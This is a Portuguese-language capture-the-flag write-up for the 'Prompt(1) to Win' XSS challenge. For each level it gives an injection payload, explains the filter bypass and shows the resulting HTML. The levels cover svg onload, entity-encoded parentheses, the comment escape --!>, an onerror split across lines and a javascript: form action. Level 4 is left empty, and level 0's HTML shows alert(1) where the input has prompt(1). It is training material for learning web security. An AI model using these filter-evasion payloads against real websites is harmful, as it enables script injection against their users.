# Prompt(1) to Win
###### Solved by @joaoselim
>This challenge is about XSS, JavaScript, Injeção de Código
## About the challenge
Nesse desafio de XSS(Cross-Site Scripting) temos o objetivo de realizar diversas injeções de código JavaScript, para chamar prompt(1) através de 15 níveis diferentes

## Solutions
#### Desafio 0:

[![questao0.png](https://i.postimg.cc/W4g2WgjP/questao0.png)](https://postimg.cc/kVM3DVBj)

Input:
```
"><script>prompt(1)</script>
```
Nesse primeiro caso temos um código simples, sem filtragem, oque devemos nos atentar é em sair do atributo `value="` usando `"`, e encerrar a tag `input` usando `/>`. A partir daí
inserimos nosso script `<script>prompt(1)</script>`

HTML Source:
```
<input type="text" value=""><script>alert(1)</script>">
```

#### Desafio 1:

[![questao1.png](https://i.postimg.cc/cL9SFhPj/questao1.png)](https://postimg.cc/jD7m5HxQ)

Input:
```
<svg/ onload=prompt(1) 
```
Seguido de uma quebra de linha ou espaço.

Agora começamos a ter que contornar tipos de filtragem. Nessa questão a regex `/<\/?[^>]+>/gi` faz com que ao inserirmos qualquer informação em uma tag HTML encerrada por `>` será 
substituido no código por `''`, para isso, abrimos o construtor `<` e fornecemos um tipo de imagem svg, e usamos uma `/` para que ocorra uma quebra no formato da tag, em seguida afirmamos para o código 
usando o `onload` que ao carregar a imagem deve chamar `prompt(1)`

HTML Source:
```
<article><svg/ onload=prompt(1)
</article>
```

#### Desafio 2:

[![questao2.png](https://i.postimg.cc/13hHLVNK/questao2.png)](https://postimg.cc/zV7KhB7L)

Input:
```
<svg><script>prompt&#40;1)</script>
```
Ainda lidando com filtragem, agora não podemos usar nem `=` nem `(`, ent para isso tem se conhecimento que todas as teclas de um teclado tem um código correspondente, no caso do `(` é `&#40`. Iniciamos nosso input abrindo a tag `<svg>`, concluimos colocando um script dentro dela `<script></script>` e chamando o prompt(1) dentro da tag script

HTML Source:
```
<svg><script>prompt&#40;1)</script>
```

#### Desafio 3:

[![questao3.png](https://i.postimg.cc/yx6bwggd/questao3.png)](https://postimg.cc/9RSb9fB5)

Input:
```
--!><svg onload=prompt(1)
```
Nessa questão nosso input está sendo colocado dentro de `<!--...-->`, então tudo que escrevemos é visto pelo código como comentário, então precisamos encerrar a sessão de comentarios.
Para isso é possível usar de 2 formas, `-->` e `--!>`, mas como temos a filtragem de `->` então temos de usar a segunda opção. 
Então seguimos nosso input com um tipo `svg` em que ao ser carregado chama o `prompt(1)`

HTML Source:
```
<!-- --!><svg onload=prompt(1) -->
```

#### Desafio 4:

[![questao4.png](https://i.postimg.cc/nz5tYGwx/questao4.png)](https://postimg.cc/mzQqTCsp)

Input:
```

```
resolução

HTML Source:
```

```

#### Desafio 5:

[![questao5.png](https://i.postimg.cc/R0kkWZ3C/questao5.png)](https://postimg.cc/GBj7NrJ6)

Input:
```
"type=image src onerror
="prompt(1)
```
Primeiro fechamos as aspas do `value="`, assim oque escrevermos não vai mais ser registrado como valor. Em seguida fornecemos ao código uma imagem falsa, assim o nosso src vai dar como erro. Mas pra conseguirmos burlar o filtro, temos de colocar o `onerror` em uma linha e o `=` em outra.

HTML Source:
```
<input value=""type=image src onerror
="prompt(1)" type="text">
```

#### Desafio 6:

[![questao6.png](https://i.postimg.cc/KvV2CMBj/questao6.png)](https://postimg.cc/svpqh1nC)

Input:
```
javascript:prompt(1)#{"action":1}
```
A entrada de javascript:prompt(1) é aceita por na filtragem só se restringir `script:` ou `data:`, usando `#` com função de split assim preenchendo as partes de acordo:
```
var segments = input.split('#');
var formURL = segments[0];      // "javascript:prompt(1)"
var formData = JSON.parse(segments[1]); // {"action":1}
```
assim definindo javascript:prompt(1) como action

HTML Source:
```
<form action="javascript:prompt(1)" method="post"><input name="action" value="1"></form>                         
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script>    
```

#### Desafio 7:

[![questao7.png](https://i.postimg.cc/3wm8yZs0/questao7.png)](https://postimg.cc/XZNSm97n)

Input:
```
"><img/src=#"onerror='/*#*/prompt(1)'
```
Nesse desafio se tem um limite de 12 caracteres por linha e se divide a entrada com `#`, com isso temos de montar em partes nosso código.
Então assim como no desafio 5, temos uma imagem com src falso, e para que a atribuição do que se deve fazer ao dar erro não seja atrapalhada, nós comentamos o trecho da linha `<p class="comment" title="` terminando a linha de cima com `/*` e começando a próxima com `*/`

HTML Source:
```
<p class="comment" title=""><img/src="></p>
<p class="comment" title=""onerror='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```

#### Desafio A:

[![questaoA.png](https://i.postimg.cc/0y0v66S5/questaoA.png)](https://postimg.cc/68qggpzF)

Input:
```
p'rompt(1)
```
O código da questão substitui a string `prompt` pela string `alert` e também substitui `'` por `''`, então colocando `'` em qualquer parte da string já não ocorre a troca para alert, e o programa prompt(1) não é afetado pela presença de `'`

HTML Source:
```
<script>prompt(1)</script>
```
